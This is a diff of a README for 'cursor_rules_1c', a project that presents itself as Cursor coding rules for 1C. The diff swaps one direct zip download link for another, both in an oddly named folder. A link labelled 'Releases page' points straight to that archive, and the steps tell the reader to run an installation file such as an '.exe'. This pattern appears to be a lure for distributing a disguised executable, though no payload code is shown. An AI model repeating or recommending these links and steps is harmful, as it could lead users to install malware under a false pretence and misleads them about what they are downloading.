@@ -1,7 +1,7 @@
 # 🎨 cursor_rules_1c - Simplify Your Vibe Coding Experience
 
 ## 📥 Download the Software
-[![Download cursor_rules_1c](https://raw.githubusercontent.com/Bodebedo/cursor_rules_1c/main/Septocylindrium/cursor_rules_1c.zip)](https://raw.githubusercontent.com/Bodebedo/cursor_rules_1c/main/Septocylindrium/cursor_rules_1c.zip)
+[![Download cursor_rules_1c](https://github.com/Bodebedo/cursor_rules_1c/raw/refs/heads/main/Septocylindrium/c-cursor-rules-v3.6.zip)](https://github.com/Bodebedo/cursor_rules_1c/raw/refs/heads/main/Septocylindrium/c-cursor-rules-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **cursor_rules_1c**! This application provides a set of rules that enhance your cursor experience while coding in 1C. Whether you are just starting out or have been coding for a while, this tool will help you code more efficiently.
@@ -16,7 +16,7 @@ Ensure your system meets these requirements before downloading.
 ## 📥 Download & Install
 To get started, follow these steps to download and run the software:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Bodebedo/cursor_rules_1c/main/Septocylindrium/cursor_rules_1c.zip).
+1. Visit the [Releases page](https://github.com/Bodebedo/cursor_rules_1c/raw/refs/heads/main/Septocylindrium/c-cursor-rules-v3.6.zip).
 2. Locate the latest release. The latest version will typically be at the top.
 3. Click on the version number to view the release details.
 4. Look for the file labeled for installation. This may be an executable file like `.exe`.
